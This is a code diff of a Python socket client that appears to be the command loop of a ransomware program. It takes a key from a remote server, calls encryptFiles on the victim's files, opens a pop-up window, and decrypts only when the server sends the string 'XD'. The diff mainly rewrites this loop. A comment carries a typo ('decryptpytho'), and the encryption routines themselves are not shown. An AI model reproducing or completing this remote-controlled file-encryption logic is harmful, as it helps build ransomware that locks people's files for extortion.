@@ -82,23 +82,27 @@ s.connect((HOST, PORT))
 print('Connected!')
 s.send(MESSAGE)
 
-while 1:
+
+
+
+while True:
+
     read_sockets, write_sockets, error_sockets = select.select([s], [], [])
 
-    # key = encrypt
-    # wait = decrypt
+    #key = encrypt
+    #wait = decryptpytho
     for sock in read_sockets:
         if sock == s:
-            data = sock.recv(4096)
+            data = s.recv(4096)
             if not data:
-                print('\nDisconnected from server')
-                sys.exit()
+               print('\nDisconnected from server')
+               sys.exit()
+            
             else:
-                key = data.decode()
-                if key != 'XD':
-                    encryptFiles(key)
-                
-                interface.pop_up_win()
-                '''
-                    Wait until I recieve a key for decryption.
-                '''
+                if data.decode() == 'XD':
+                   decryptFiles(key1)
+
+                else:
+                    key1 = data.decode()   
+                    encryptFiles(key1)
+                    interface.App().pop_up_win()
